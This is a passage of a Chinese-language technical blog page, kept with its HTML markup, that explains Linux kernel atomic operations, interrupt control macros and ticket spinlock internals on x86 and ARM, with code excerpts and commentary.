data-language="c"><code class="language-c"><span class="token comment">//原子读取变量中的值</span><span class="token keyword">static</span> __always_inline <span class="token keyword">int</span> <span class="token function">arch_atomic_read</span><span class="token punctuation">(</span><span class="token keyword">const</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">__READ_ONCE</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//原子写入一个具体的值</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_atomic_set</span><span class="token punctuation">(</span>atomic_t <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">__WRITE_ONCE</span><span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//原子加上一个具体的值</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_atomic_add</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span>LOCK_PREFIX <span class="token string">"addl %1,%0"</span>             <span class="token operator">:</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span>             <span class="token operator">:</span> <span class="token string">"ir"</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//原子减去一个具体的值</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_atomic_sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span>LOCK_PREFIX <span class="token string">"subl %1,%0"</span>             <span class="token operator">:</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span>             <span class="token operator">:</span> <span class="token string">"ir"</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//原子加1</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_atomic_inc</span><span class="token punctuation">(</span>atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span>LOCK_PREFIX <span class="token string">"incl %0"</span>             <span class="token operator">:</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span> <span class="token operator">::</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//原子减1</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_atomic_dec</span><span class="token punctuation">(</span>atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span>LOCK_PREFIX <span class="token string">"decl %0"</span>             <span class="token operator">:</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span> <span class="token operator">::</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><p><code>LOCK_PREFIX</code>是一个宏，根据需要展开成<code>“lock;”</code>或空串，单核心CPU是不需要lock前缀的，只要在多核心CPU下才需要加上lock前缀</p></li><li><p><code>__READ_ONCE</code>，<code>__WRITE_ONCE</code>两个宏是对代码封装并利用GCC的特性对代码进行检查，把让错误显现在编译阶段</p></li></ol></blockquote></li><li><p>ARM体系</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ATOMIC_OP</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> c_op<span class="token punctuation">,</span> asm_op<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> atomic_</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">op</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">{</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">int</span> result<span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token expression"><span class="token function">prefetchw</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression">__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span></span><span class="token string">"@ atomic_"</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">op</span> </span></span><span class="token string">"\n"</span><span class="token punctuation">\</span><span class="token string">"1:ldrex%0, [%3]\n"</span><span class="token punctuation">\</span><span class="token string">""</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">asm</span><span class="token expression">_op </span></span></span><span class="token string">"%0, %0, %4\n"</span><span class="token punctuation">\</span><span class="token string">"strex%1, %0, [%3]\n"</span><span class="token punctuation">\</span><span class="token string">"teq%1, #0\n"</span><span class="token punctuation">\</span><span class="token string">"bne1b"</span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"=&amp;r"</span> <span class="token expression"><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"=&amp;r"</span> <span class="token expression"><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"+Qo"</span> <span class="token expression"><span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"r"</span> <span class="token expression"><span class="token punctuation">(</span><span class="token operator">&amp;</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"Ir"</span> <span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"cc"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">}</span></span></span>\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li>原子操作的原子性依赖于<code>ldrex</code>与<code>strex</code>实现</li><li><code>ldrex</code>读取数据时会进行独占标记，防止其他内核路径访问，直至调用<code>strex</code>完成写入后清除标记</li><li><code>strex</code>也不能写入被别的内核路径独占的内存，若是写入失败则循环至成功写入</li></ol></blockquote></li></ul><h3 id="Linux控制中断">Linux控制中断</h3><ul><li><p>Linux中有很多场景需要在关中断下才可以安全执行一些操作</p><ul><li><p>多个中断处理程序需要访问一些共享数据，一个中断程序在访问数据时必须保证自身和其它中断处理程序互斥</p></li><li><p>设备驱动程序在设置设备寄存器时必须让CPU停止响应中断</p></li></ul></li><li><p>Linux控制CPU响应中断的函数（<a href="https://elixir.bootlin.com/linux/v5.10.13/source/include/linux/irqflags.h#L186">参阅相关代码</a>）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//实际保存eflags寄存器</span><span class="token keyword">extern</span> __always_inline <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">native_save_fl</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"# __raw_save_flags\n\t"</span>                 <span class="token string">"pushf ; pop %0"</span><span class="token operator">:</span><span class="token string">"=rm"</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token operator">::</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> flags<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//实际恢复eflags寄存器</span><span class="token keyword">extern</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">native_restore_fl</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"push %0 ; popf"</span><span class="token operator">::</span><span class="token string">"g"</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">,</span><span class="token string">"cc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//实际关中断</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">native_irq_disable</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"cli"</span><span class="token operator">::</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//实际开启中断</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">native_irq_enable</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"sti"</span><span class="token operator">::</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//arch层关中断</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_local_irq_disable</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">native_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//arch层开启中断</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">arch_local_irq_enable</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">native_irq_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//arch层保存eflags寄存器</span><span class="token keyword">static</span> __always_inline <span class="token keyword">unsigned</span> <span class="token keyword">long</span>           <span class="token function">arch_local_save_flags</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">native_save_fl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//arch层恢复eflags寄存器</span><span class="token keyword">static</span>  __always_inline <span class="token keyword">void</span> <span class="token function">arch_local_irq_restore</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">native_restore_fl</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//实际保存eflags寄存器并关中断</span><span class="token keyword">static</span> __always_inline <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">arch_local_irq_save</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags <span class="token operator">=</span> <span class="token function">arch_local_save_flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">arch_local_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> flags<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//raw层关闭开启中断宏</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">raw_local_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token function">arch_local_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">raw_local_irq_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token function">arch_local_irq_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token comment">//raw层保存恢复eflags寄存器宏</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">raw_local_irq_save</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span>           </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token punctuation">\</span>        <span class="token expression">flags <span class="token operator">=</span> <span class="token function">arch_local_irq_save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">raw_local_irq_restore</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span>            </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">arch_local_irq_restore</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">raw_local_save_flags</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span>         </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token punctuation">\</span>        <span class="token expression">flags <span class="token operator">=</span> <span class="token function">arch_local_save_flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token comment">//通用层接口宏 </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">local_irq_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span> </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">raw_local_irq_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">local_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>             </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">raw_local_irq_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">local_irq_save</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span>               </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">raw_local_irq_save</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">local_irq_restore</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span>            </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span>                        </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token function">raw_local_irq_restore</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>       </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>编译Linux代码时，编译器自动对宏进行展开，其中，<code>do{}while(0)</code>是Linux代码中一种常用的技巧，可以保证大括号中的代码片段执行一次，保证宏展开时这个代码片段是一个整体</p></blockquote></li></ul><br><h3 id="spinlock">spinlock</h3><ul><li><p>Linux原始的自旋锁（wild spinlock）本质上用一个整数来表示，1代表锁未被占用，0或者负表示被占用，但是等锁者之间的公平性无法获得保证<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup><sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></p></li><li><p>Linux内核 2.6.25 版本引入了排队自旋锁（ticket spinlock）解决获取自旋锁的公平性</p><blockquote><p>spinlock的公平性：先到先唤醒，后到后唤醒，只有next域与owner域相等时，才表示自旋锁处于未使用的状态，Linux进程执行申请自旋锁时，原子地将next域加1，进程释放自旋锁时，原子地将owner域加1</p><ol><li>初始化时owner = next = 0，第一个thread获取spinlock可获取成功</li><li>第二个thread获取spinlock，如果第一个thread还没有释放锁，则next ++</li><li>第三个thread获取spinlock，如果第一个thread还没有释放锁，则next = 2</li><li>此时第一个thread释放spinlock，则执行owner ++，owner = 1</li><li>此时虽然第二个和第三个thread都在等待锁，但因为第二个thread的owner = next，可以获取锁，第三个thread继续等待</li></ol></blockquote></li></ul><h4 id="使用-2">使用</h4><ul><li><p>使用示例</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c">spinlock_t count_lock<span class="token punctuation">;</span><span class="token keyword">int</span> open_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">spin_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">spin_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">spin_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">spin_lock_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>spin_lock basic API</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220717-spinlock-api.png" alt=""></p></li><li><p>spin_lock API &amp; irq</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220717-spinlock-api-irq.png" alt=""></p><blockquote><p>性能上：spin_lock &gt; spin_lock_bh &gt; spin_lock_irq &gt; spin_lock_irqsave</p><p>安全上：spin_lock_irqsave &gt; spin_lock_irq &gt; spin_lock_bh &gt;spin_lock</p></blockquote></li></ul><h4 id="spinlock内核源码">spinlock内核源码</h4><ul><li><p>spinlock源码与体系相关，数据结构如下（ARM）<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup></p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// spinlock -&gt; raw_spinlock（有硬实时补丁也不能睡眠） -&gt; arch_spinlock_t</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token keyword">union</span> <span class="token punctuation">{</span>u32 slock<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">__raw_tickets</span> <span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__ARMEB__ </span><span class="token comment">//大端</span></span>u16 next<span class="token punctuation">;</span>  <span class="token comment">//owner表示持有这个数字的thread可以获取自旋锁</span>u16 owner<span class="token punctuation">;</span> <span class="token comment">//next表示如果后续再有thread请求获取这个自旋锁就给它分配这个数字</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>u16 owner<span class="token punctuation">;</span>u16 next<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">}</span> tickets<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> arch_spinlock_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//spin_lock_init -&gt; raw_spin_lock_init -&gt; __RAW_SPIN_LOCK_UNLOCKED -&gt; __RAW_SPIN_LOCK_INITIALIZER -&gt; __ARCH_SPIN_LOCK_UNLOCKED</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">__ARCH_SPIN_LOCK_UNLOCKED<span class="token punctuation">{</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>u32 lock<span class="token punctuation">;</span><span class="token punctuation">}</span> arch_rwlock_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>spin_lock（）</p><p>UP：如果内核不允许抢占，spin_lock是个空函数，如果内核允许抢占，spin_lock只是禁止抢占</p><p>SMP：spin_lock除了禁止抢占，还会调用体系相关代码实现排他性loop</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//UP：单核CPU</span><span class="token comment">//spin_lock -&gt; raw_spin_lock(_raw_spin_lock) -&gt; __LOCK(lock)</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">__LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token function">preempt_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">___LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> </span><span class="token comment">//抢占关闭</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">___LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token function">__acquire</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token comment">//SMP：多核</span><span class="token comment">//spin_lock -&gt; raw_spin_lock(_raw_spin_lock) -&gt; __raw_spin_lock -&gt; __raw_spin_lock</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">__raw_spin_lock</span><span class="token punctuation">(</span>raw_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// 禁止抢占</span><span class="token function">preempt_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// for debug</span><span class="token function">spin_acquire</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>dep_map<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 